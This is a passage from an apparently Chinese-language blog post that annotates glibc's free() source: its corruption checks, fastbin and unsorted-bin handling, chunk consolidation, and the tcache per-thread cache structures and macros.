pointer&quot;</span>;<br>    errout:<br>        <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked) __libc_lock_unlock(av-&gt;mutex);<br>        malloc_printerr(check_action, errstr, chunk2mem(p), av);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">       multiple of MALLOC_ALIGNMENT.  */</span><br>    <span class="hljs-comment">// 大小没有最小的chunk大，或者说，大小不是MALLOC_ALIGNMENT的整数倍</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-comment">// 检查该chunk是否处于使用状态，非调试状态下没有作用</span><br>    check_inuse_chunk(av, p);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br><br>    <span class="hljs-keyword">if</span> (tcache<br>&amp;&amp; tc_idx &lt; mp_.tcache_bins<br>&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>      &#123;<br>tcache_put (p, tc_idx);<br><span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><p>其中</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p)                                                    \</span><br><span class="hljs-meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="hljs-meta">     MALLOC_ALIGN_MASK)</span><br></code></pre></div></td></tr></table></figure><h3 id="on-fastbin"><a href="#on-fastbin" class="headerlink" title="on fastbin"></a>on fastbin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If eligible, place chunk on a fastbin so it can be found</span><br><span class="hljs-comment">        and used quickly in malloc.</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast())<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> TRIM_FASTBINS</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">        bordering top into fastbins </span><br><span class="hljs-comment">        */</span><br>        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) <span class="hljs-comment">//这个宏是在if语句里加上一条,意义是p不和top chunk相邻</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    )<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || <br>            __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>        &#123;<br>            <span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">        of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">        after getting the lock.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock || (<br>                                &#123;<br>                                    assert(locked == <span class="hljs-number">0</span>);<br>                                    __libc_lock_lock(av-&gt;mutex);<br>                                    locked = <span class="hljs-number">1</span>;<br>                                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ || <br>                                    chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;<br>                                &#125;))<br>            &#123;<br>                errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!have_lock)<br>            &#123;<br>                __libc_lock_unlock(av-&gt;mutex);<br>                locked = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 将chunk的mem部分全部设置为perturb_byte</span><br>        free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>        <span class="hljs-comment">// 设置fast chunk的标记位</span><br>        set_fastchunks(av);<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx = fastbin_index(size);<br>        fb = &amp;fastbin(av, idx); <span class="hljs-comment">//取出fastbin头指针</span><br><br>        <span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>        <span class="hljs-comment">//多线程相关, 跳过</span><br>        mchunkptr old = *fb, old2;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> old_idx = ~<span class="hljs-number">0u</span>; <span class="hljs-comment">//不就是 1 吗?</span><br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">        (i.e., double free).  */</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>            &#123; <span class="hljs-comment">//防止对 fast bin double free</span><br>                errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">        size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">        only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">        deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>                old_idx = fastbin_index(chunksize(old));<br>            p-&gt;fd = old2 = old;<br>        &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);<br><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="hljs-number">0</span>))<br>        &#123;<br>            errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="合并非-mmap-的空闲-chunk"><a href="#合并非-mmap-的空闲-chunk" class="headerlink" title="合并非 mmap 的空闲 chunk"></a>合并非 mmap 的空闲 chunk</h3><p><strong>只有不是 fast bin 的情况下才会触发 unlink</strong> </p><p>首先我们先说一下为什么会合并 chunk，这是为了避免 heap 中有太多零零碎碎的内存块，合并之后可以用来应对更大的内存块请求。合并的主要顺序为</p><ol><li>先考虑物理低地址空闲块</li><li>后考虑物理高地址空闲块</li></ol><p><strong>合并后的 chunk 指向合并的 chunk 的低地址。</strong> </p><p>在没有锁的情况下，先获得锁。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  Consolidate other non-mmapped chunks as they arrive.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>        __libc_lock_lock(av-&gt;mutex);<br>        locked = <span class="hljs-number">1</span>;<br>    &#125;<br>    nextchunk = chunk_at_offset(p, size);<br></code></pre></div></td></tr></table></figure><h4 id="轻量级的检测"><a href="#轻量级的检测" class="headerlink" title="轻量级的检测"></a>轻量级的检测</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Lightweight tests: check whether the block is already the</span><br><span class="hljs-comment">   top block.  */</span><br><span class="hljs-comment">// 当前free的chunk不能是top chunk</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(p == av-&gt;top)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 当前free的chunk的下一个chunk不能超过arena的边界</span><br><span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br><span class="hljs-keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp;<br>                         (<span class="hljs-keyword">char</span> *) nextchunk &gt;=<br>                             ((<span class="hljs-keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)),<br>                     <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 当前要free的chunk的使用标记没有被标记，double free</span><br><span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk))) &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 下一个chunk的大小</span><br>nextsize = chunksize(nextchunk);<br><span class="hljs-comment">// next chunk size valid check</span><br><span class="hljs-comment">// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者</span><br><span class="hljs-comment">// nextsize是否大于系统可提供的内存</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(nextchunk) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>    __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="释放填充"><a href="#释放填充" class="headerlink" title="释放填充"></a>释放填充</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">      <span class="hljs-comment">//将指针的mem部分全部设置为perturb_byte        </span><br>free_perturb(chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br></code></pre></div></td></tr></table></figure><h4 id="后向合并-合并低地址-chunk"><a href="#后向合并-合并低地址-chunk" class="headerlink" title="后向合并 - 合并低地址 chunk"></a>后向合并 - 合并低地址 chunk</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/* consolidate backward */</span>        <br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;            <br>    prevsize = prev_size(p);            <br>    size += prevsize;            <br>    p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));            <br>    unlink(av, p, bck, fwd);        <br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="下一块不是-top-chunk-合并高地址-chunk放入unsorted"><a href="#下一块不是-top-chunk-合并高地址-chunk放入unsorted" class="headerlink" title="下一块不是 top chunk - 合并高地址 chunk放入unsorted"></a>下一块不是 top chunk - 合并高地址 chunk放入unsorted</h4><p>需要注意的是，如果下一块不是 top chunk ，则合并，并将合并后的 chunk 放入到 unsorted bin 中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 如果下一个chunk不是top chunk</span><br><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>    <span class="hljs-comment">/* get and clear inuse bit */</span><br>    <span class="hljs-comment">// 获取下一个 chunk 的使用状态</span><br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>    <span class="hljs-comment">// 如果不在使用，合并，否则清空当前chunk的使用状态。</span><br>    <span class="hljs-comment">/* consolidate forward */</span><br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>        unlink(av, nextchunk, bck, fwd);<br>        size += nextsize;<br>    &#125; <span class="hljs-keyword">else</span><br>        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">  Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">  not placed into regular bins until after they have</span><br><span class="hljs-comment">  been given one chance to be used in malloc.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 把 chunk 放在 unsorted chunk 链表的头部</span><br>    bck = unsorted_chunks(av);<br>    fwd = bck-&gt;fd;<br>    <span class="hljs-comment">// 简单的检查</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    p-&gt;fd = fwd;<br>    p-&gt;bk = bck;<br>    <span class="hljs-comment">// 如果是 large chunk，那就设置nextsize指针字段为NULL。</span><br>    <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>        p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>        p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    bck-&gt;fd = p;<br>    fwd-&gt;bk = p;<br><br>    set_head(p, size | PREV_INUSE);<br>    set_foot(p, size);<br><br>    check_free_chunk(av, p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="下一块是-top-chunk-合并到-top-chunk"><a href="#下一块是-top-chunk-合并到-top-chunk" class="headerlink" title="下一块是 top chunk - 合并到 top chunk"></a>下一块是 top chunk - 合并到 top chunk</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">  consolidate into top</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk</span><br><span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>    <span class="hljs-comment">//只用于DE<span class="hljs-doctag">BUG:</span></span><br>    check_chunk(av, p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="向系统返还内存"><a href="#向系统返还内存" class="headerlink" title="向系统返还内存"></a>向系统返还内存</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If freeing a large space, consolidate possibly-surrounding</span><br><span class="hljs-comment">          chunks. Then, if the total unused topmost memory exceeds trim</span><br><span class="hljs-comment">          threshold, ask malloc_trim to reduce top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          Unless max_fast is 0, we don&#x27;t know if there are fastbins</span><br><span class="hljs-comment">          bordering top, so we cannot tell for sure whether threshold</span><br><span class="hljs-comment">          has been reached unless fastbins are consolidated.  But we</span><br><span class="hljs-comment">          don&#x27;t want to consolidate on each free.  As a compromise,</span><br><span class="hljs-comment">          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span><br><span class="hljs-comment">          is reached.</span><br><span class="hljs-comment">        */</span><br>         <span class="hljs-comment">// 如果合并后的 chunk 的大小大于FASTBIN_CONSOLIDATION_THRESHOLD</span><br>         <span class="hljs-comment">// 一般合并到 top chunk 都会执行这部分代码。</span><br>         <span class="hljs-comment">// 那就向系统返还内存</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>            <span class="hljs-comment">// 如果有 fast chunk 就进行合并</span><br>            <span class="hljs-keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);<br>            <span class="hljs-comment">// 主分配区</span><br>            <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>                <span class="hljs-comment">// top chunk 大于当前的收缩阙值</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (chunksize(av-&gt;top)) &gt;=<br>                    (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (mp_.trim_threshold))<br>                    systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>      <span class="hljs-comment">// 非主分配区，则直接收缩heap</span></span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">                   large, because the corresponding heap might go away.  */</span><br>                heap_info *heap = heap_for_ptr(top(av));<br><br>                assert(heap-&gt;ar_ptr == av);<br>                heap_trim(heap, mp_.top_pad);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>            assert(locked);<br>            __libc_lock_unlock(av-&gt;mutex);<br>        &#125;<br></code></pre></div></td></tr></table></figure><h3 id="释放-mmap-的-chunk"><a href="#释放-mmap-的-chunk" class="headerlink" title="释放 mmap 的 chunk"></a>释放 mmap 的 chunk</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//  If the chunk was allocated via mmap, release via munmap().</span><br>    munmap_chunk(p);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><h2 id="两个struct"><a href="#两个struct" class="headerlink" title="两个struct"></a>两个struct</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指向的user-date部分嗷</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-keyword">static</span> __thread <span class="hljs-keyword">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></div></td></tr></table></figure><p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p><ul><li><code>tcache_entry</code> 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li><li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</li></ul><h2 id="基本宏定义"><a href="#基本宏定义" class="headerlink" title="基本宏定义"></a>基本宏定义</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_FILL_COUNT 7</span><br></code></pre></div></td></tr></table></figure><ul><li>Tcache为每个线程都预留了这样一个特殊的bins， bin的数量是64个 每个bin中最多缓存7个chunk。在64位系统上以0x10的字节递增，<strong>从24递增到1032字节</strong>。32位系统上则<strong>从12到512字节</strong>，所以Tcache缓存的是<strong>非Large Chunk的chunk</strong> </li></ul><h2 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h2><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li><li>free 内存，且 size 小于 small bin size 时</li><li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li><li>tcache 后：<ul><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li><li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 